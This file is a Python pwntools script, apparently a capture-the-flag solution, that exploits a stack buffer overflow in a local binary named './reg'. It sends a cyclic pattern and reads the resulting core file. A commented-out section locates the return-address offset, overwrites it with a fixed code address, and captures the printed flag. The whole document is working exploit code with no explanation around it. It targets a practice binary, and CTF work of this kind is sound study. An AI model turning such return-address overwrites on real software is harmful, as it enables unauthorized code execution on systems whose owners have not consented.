#!/usr/bin/python3

from pwn import *


prc = process('./reg')

prc.sendlineafter('Enter your name :', cyclic(100))

core = prc.corefile

print(core.read)

'''
def find_eip(payload):
    p = process(exe)
    p.sendlineafter('Enter your name :', payload)
    p.wait()
    rip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))
    info(f'located rip at address: {rip_offset}')

    return rip_offset

exe = './reg'

elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

offset = find_eip(cyclic(100))

io = process()

payload = flat({
    offset: 0x0000000000401206
})

io.sendlineafter('Enter your name :', payload)
io.recvuntil('Congratulations')

flag = io.recvline()

print(flag)

'''
